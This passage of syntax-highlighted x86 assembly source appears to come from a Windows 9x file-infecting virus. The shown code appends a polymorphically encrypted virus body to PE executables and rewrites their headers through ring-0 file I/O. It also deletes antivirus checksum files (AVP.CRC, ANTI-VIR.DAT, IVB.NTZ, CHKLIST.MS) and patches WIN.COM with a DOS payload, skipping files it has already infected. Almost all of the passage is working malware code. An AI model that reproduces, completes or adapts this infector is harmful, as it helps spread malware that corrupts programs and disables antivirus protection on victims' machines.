        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDPatch</span><span class="sc0">                        </span><span class="sc1">;unpatch VxDCalls (and VMM)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncCounter</span><span class="sc0">                      </span><span class="sc1">;a ASCII counter rules</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">                         </span><span class="sc1">;encrypt,createpoly,returnsize (in ecx)</span><span class="sc0">
                 
        </span><span class="sc1">;encrypt-^ returns the virus size in ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;ECX = Alignment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Align</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;aligned size to append</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Size of rawdata</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; &amp; virtual size</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">viruscopy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;polymorfer returns size in </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                </span><span class="sc1">;the ECX register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;append virus</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pointertope</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;overwrite PE header</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">nope</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">killAVfiles</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infectwindotcom</span><span class="sc0">                 </span><span class="sc1">;for payload</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dontinfect</span><span class="sc0">

</span><span class="sc5">windotcom</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\WINDOWS\WIN.COM"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">                 </span><span class="sc1">;for payload</span><span class="sc0">
</span><span class="sc5">sizewdc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windotcom</span><span class="sc0">

</span><span class="sc5">avpcrc</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">antivirdat</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">ivbntz</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">chklistms</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">killAVfiles</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
                                </span><span class="sc1">;first add the path to the filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">avpcrc</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">killing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">killthisfile</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">killing</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">killthisfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">;search from left to right for the dot</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'  ;search from right to left for the \
</span><span class="sc13">        scasb
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;edi pointed to char before \
        inc     edi     ;edi pointed to \
</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2027h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       ****    MODIFIES COM FILES FOR PAYLOAD, SPECIAL FOR WIN.COM     ***</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">infectwindotcomflag</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">infectwindotcom</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;called if virus is not resident</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infectwindotcomflag</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc12">'!'</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">windotcom</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sizewdc</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">payloadinfector</span><span class="sc0">

</span><span class="sc5">backfrominfecting</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infectwindotcomflag</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">173d</span><span class="sc0"> </span><span class="sc1">;≠</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">            
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">jmpop</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0e990h</span><span class="sc0">                          </span><span class="sc1">;nop &amp; jmp</span><span class="sc0">
</span><span class="sc5">jmpval</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">payloadinfector</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'PRUB'</span><span class="sc0">        </span><span class="sc1">;*BURP.COM ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">wegvancom</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;ecx=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;edx=1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;ebx=2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">wegvancom</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;file handle</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">first4bts</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;read first 4 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">first4bts</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">;a renamed EXE ??</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closecomfile</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">first4bts</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc2">0e990h</span><span class="sc0">   </span><span class="sc1">;already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closecomfile</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;get it's size</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc2">0100h</span><span class="sc4">-</span><span class="sc5">dospayloadsize</span><span class="sc0"> </span><span class="sc1">;infectable?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">closecomfile</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">jmpval</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;distance to jmp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmpop</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Write new jMP at 0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;place to append</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dospayload</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">dospayloadsize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                          </span><span class="sc1">;read 7 bytes before the end</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;just a buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'SN'</span><span class="sc0"> </span><span class="sc1">;ENUNS? (ENU is</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">closecomfile</span><span class="sc0">                                </span><span class="sc1">;optional)</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc5">dospayloadsize</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">dospayloadsize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">                       </span><span class="sc1">;append updated ENUNS </span><span class="sc0">

</span><span class="sc5">closecomfile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">wegvancom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">debug_beep</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infectwindotcomflag</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">],</span><span class="sc12">'!'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">backfrominfecting</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">quitinfect</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       ***     BEEPS used if debug equ 1                               ***</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">debug_beep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">        

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70408h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">geenirritantgebiepvandaag</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">12345678h</span><span class="sc4">/</span><span class="sc5">debug_beep_FREQ</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
